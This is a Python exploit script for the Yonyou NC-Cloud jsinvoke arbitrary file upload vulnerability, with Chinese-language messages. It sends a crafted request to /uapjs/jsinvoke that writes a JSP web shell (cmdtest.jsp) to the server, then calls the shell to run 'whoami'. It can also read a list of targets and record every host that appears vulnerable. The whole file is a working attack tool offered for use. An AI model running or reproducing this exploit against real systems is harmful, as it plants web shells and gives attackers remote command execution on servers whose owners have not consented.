
import requests
import argparse
import urllib3
import sys
import base64

urllib3.disable_warnings()


def title(vuln):
    print("""
                               {}
                      use: python3 {}.py
                                 Author: kento-sec
    """.format(vuln, vuln))


class Information(object):
    def __init__(self, args, vuln):
        self.args = args
        self.url = args.url
        self.file = args.file
        self.vuln = vuln

    def target_url(self):
        try:
            requests.packages.urllib3.disable_warnings()
            header = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36',
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            url = self.url + "/uapjs/jsinvoke/?action=invoke"
            data = {
                "serviceName": "nc.itf.iufo.IBaseSPService",
                "methodName": "saveXStreamConfig",
                "parameterTypes": ["java.lang.Object", "java.lang.String"],
                "parameters": ["${param.getClass().forName(param.error).newInstance().eval(param.cmd)}", "webapps/nc_web/cmdtest.jsp"]
            }
            proxies={
                'http': 'http://127.0.0.1:8080',
                'https': 'http://127.0.0.1:8080'
            }
            response = requests.post(url, headers=header, json=data, verify=False, timeout=5,proxies=proxies)
            if response.status_code == 200:
                getUrl = self.url + "/cmdtest.jsp?error=bsh.Interpreter&cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec(%22whoami%22).getInputStream()) "
                getResponse = requests.get(getUrl,headers=header,verify=False, timeout=5)
                if getResponse.status_code == 200:
                    print("\033[36m[o]目标存在{},漏洞位置：{} \033[0m".format(self.vuln, url))
                    with open("{}结果.txt".format(self.vuln), mode="a") as rp:
                        rp.write(self.url + "\n")

            else:
                print("\033[31m[x] 目标 {} 不存在{} \033[0m".format(self.url, self.vuln))
        except requests.exceptions.ConnectionError:
            print("链接错误")
            pass
        except requests.exceptions.ReadTimeout:
            print("链接错误")
            pass

    def file_url(self):
        with open(self.file, "r") as urls:
            for url in urls:
                url = url.strip()  # 去除两边空格
                if url[:4] != "http":
                    url = "http://" + url
                self.url = url.strip()
                self.target_url()


if __name__ == "__main__":
    vuln = "用友NC-Cloud-jsinvoke-任意文件上传漏洞"
    title(vuln)
    parser = argparse.ArgumentParser(description=vuln)
    parser.add_argument("-u", "--url", type=str, metavar="url", help="Target url eg:\"http://127.0.0.1\"")
    parser.add_argument("-f", "--file", metavar="file", help="Targets in file  eg:\"target.txt\"")
    args = parser.parse_args()
    if len(sys.argv) != 3:
        print(
            "[-]  参数错误！\neg1:>>>python3 {}.py -u http://127.0.0.1\neg2:>>>python3 {}.py -f ip.txt".format(vuln, vuln))
    elif args.url:
        Information(args, vuln).target_url()
    elif args.file:
        Information(args, vuln).file_url()
